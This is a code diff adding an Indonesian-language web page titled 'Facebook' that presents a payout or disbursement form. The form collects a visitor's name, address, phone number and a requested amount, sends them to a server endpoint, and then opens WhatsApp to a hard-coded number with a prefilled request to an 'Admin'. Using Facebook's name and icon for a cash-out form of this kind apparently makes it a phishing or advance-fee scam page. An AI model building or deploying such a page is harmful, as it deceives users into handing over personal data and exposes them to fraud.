@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="icon" type="image/png" href="FB.png">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="main-container">
+        <div class="content-center">
+            <div class="login-box formulir-box">
+                <h1 class="formulir-title">FORMULIR PENCAIRAN</h1>
+                
+                <form id="pencairanForm" class="login-form">
+                    <div class="form-group">
+                        <input type="text" id="nama" placeholder="Masukkan Nama Anda" class="input-field" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <input type="text" id="alamat" placeholder="Masukkan Alamat Anda" class="input-field" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <input type="text" id="no_hp" placeholder="Masukkan Nomor HP atau WhatsApp" class="input-field" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <input type="text" id="jumlah_pencairan" placeholder="Jumlah Pencairan" class="input-field" required>
+                    </div>
+                    
+                    <button type="submit" class="cairkan-btn">CAIRKAN</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('jumlah_pencairan').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 0) {
+                value = parseInt(value).toLocaleString('id-ID');
+            }
+            e.target.value = value;
+        });
+
+        document.getElementById('pencairanForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const nama = document.getElementById('nama').value;
+            const alamat = document.getElementById('alamat').value;
+            const no_hp = document.getElementById('no_hp').value;
+            let jumlah_pencairan = document.getElementById('jumlah_pencairan').value;
+            
+            const num = parseInt(jumlah_pencairan.replace(/\./g, ''));
+            if (num < 100000 || num > 50000000) {
+                alert('Jumlah pencairan harus antara 100.000 - 50.000.000!');
+                return;
+            }
+            
+            const jumlahFormatted = 'Rp. ' + num.toLocaleString('id-ID');
+            
+            try {
+                const response = await fetch('/api/pencairan', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        nama: nama, 
+                        alamat: alamat, 
+                        no_hp: no_hp, 
+                        jumlah_pencairan: jumlahFormatted 
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    const waNumber = '6281260945524';
+                    const waMessage = `Halo Admin,
+
+Saya telah mengisi formulir pencairan dengan detail:
+
+📋 Nama: ${nama}
+📍 Alamat: ${alamat}
+📱 No. HP/WA: ${no_hp}
+💰 Jumlah Pencairan: ${jumlahFormatted}
+
+Mohon diproses. Terima kasih!`;
+                    
+                    const encodedMessage = encodeURIComponent(waMessage);
+                    const waUrl = `https://wa.me/${waNumber}?text=${encodedMessage}`;
+                    
+                    window.open(waUrl, '_blank');
+                    
+                    document.getElementById('pencairanForm').reset();
+                } else {
+                    alert('Gagal menyimpan data!');
+                }
+            } catch (error) {
+                alert('Terjadi kesalahan koneksi!');
+            }
+        });
+    </script>
+</body>
+</html>
